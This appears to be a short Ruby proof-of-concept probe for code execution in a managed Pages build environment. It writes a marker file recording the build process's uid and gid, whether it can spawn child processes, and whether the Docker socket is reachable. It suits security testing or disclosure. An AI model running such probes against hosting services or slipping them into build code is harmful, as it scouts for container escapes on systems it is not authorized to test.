marker = "PAGES_MANAGED_BUILD_RCE_V1 uid=#{Process.uid} gid=#{Process.gid} child_ok=#{system("/usr/bin/true")} docker_socket=#{File.socket?("/var/run/docker.sock")}\n"
File.write(File.join(__dir__, "pages-managed-build-rce-marker.txt"), marker)
